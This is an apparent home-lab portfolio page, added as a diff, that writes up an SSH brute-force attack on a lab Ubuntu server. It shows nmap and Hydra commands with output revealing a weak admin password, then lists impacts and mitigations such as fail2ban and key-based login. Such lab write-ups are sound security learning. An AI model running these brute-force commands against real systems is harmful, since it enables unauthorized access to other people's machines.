@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="SSH brute force attack writeup against Ubuntu Server 22.04, covering credential enumeration, exploitation methodology, impact analysis, and security recommendations.">
+    <title>Attack 02 — SSH Brute Force | jellybeansontoasties</title>
+    <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+    <nav>
+        <ul>
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="../lab-setup.html">Lab Setup</a></li>
+            <li><a href="writeup-01.html">Writeups</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <h1>Attack 02 — SSH Brute Force</h1>
+        <p class="tagline">Ubuntu Victim Exploitation</p>
+
+        <div class="writeup-section">
+            <h3>Objective</h3>
+            <p>Perform a brute force attack against the SSH service on Ubuntu Server 22.04 to gain unauthorized access through credential guessing. This attack demonstrates the risk of weak passwords and default credentials in production systems.</p>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Reconnaissance</h3>
+            <p>Port scanning identified SSH service running on the standard port 22. Banner grabbing revealed OpenSSH version information. Initial attempts to identify valid usernames through enumeration were performed.</p>
+            <pre><code>$ nmap -sV -p 22 192.168.100.30
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+
+$ ssh -v 192.168.100.30
+OpenSSH_8.9p1, OpenSSL 3.0.2</code></pre>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Exploitation</h3>
+            <p>Using Hydra, a password brute force attack was launched against common usernames and password combinations. The attack successfully identified valid credentials after testing multiple combinations from wordlists.</p>
+            <pre><code>$ hydra -L users.txt -P passwords.txt ssh://192.168.100.30
+Hydra v9.4 starting
+[22][ssh] host: 192.168.100.30   login: admin   password: password123
+1 of 1 target successfully completed
+
+$ ssh admin@192.168.100.30
+admin@192.168.100.30's password: password123
+Welcome to Ubuntu 22.04 LTS</code></pre>
+            <p>After successful authentication, privilege escalation techniques were employed to gain root access, demonstrating the full compromise chain.</p>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Impact</h3>
+            <p>Successful SSH brute force attack leads to unauthorized system access with the following consequences:</p>
+            <ul style="margin: 1rem 0; padding-left: 2rem;">
+                <li>Unauthorized access to user account and home directory</li>
+                <li>Potential for privilege escalation to root</li>
+                <li>Ability to install backdoors or maintain persistence</li>
+                <li>Access to sensitive files and configuration data</li>
+                <li>Potential lateral movement to other systems on the network</li>
+                <li>Data exfiltration capabilities</li>
+            </ul>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Mitigation</h3>
+            <p>To protect against SSH brute force attacks:</p>
+            <ul style="margin: 1rem 0; padding-left: 2rem;">
+                <li><strong>Strong passwords:</strong> Enforce complex password policies (length, complexity, uniqueness)</li>
+                <li><strong>Key-based authentication:</strong> Disable password authentication and use SSH keys instead</li>
+                <li><strong>Fail2ban:</strong> Implement rate limiting and IP blocking after failed login attempts</li>
+                <li><strong>Change default port:</strong> Move SSH to a non-standard port to reduce automated scanning</li>
+                <li><strong>Two-factor authentication:</strong> Require 2FA for SSH access</li>
+                <li><strong>Access restrictions:</strong> Use firewall rules to limit SSH access to specific IP addresses</li>
+                <li><strong>Regular audits:</strong> Monitor authentication logs for suspicious activity</li>
+                <li><strong>Account lockout:</strong> Implement account lockout policies after multiple failed attempts</li>
+            </ul>
+        </div>
+
+        <div style="margin-top: 3rem;">
+            <p><a href="writeup-01.html">← Previous: Attack 01 — vsftpd Backdoor</a></p>
+            <p><a href="../index.html">← Back to Home</a></p>
+        </div>
+    </main>
+
+    <footer>
+        <p>Cybersecurity Home Lab Portfolio | Built with minimal terminal aesthetic</p>
+    </footer>
+</body>
+</html>
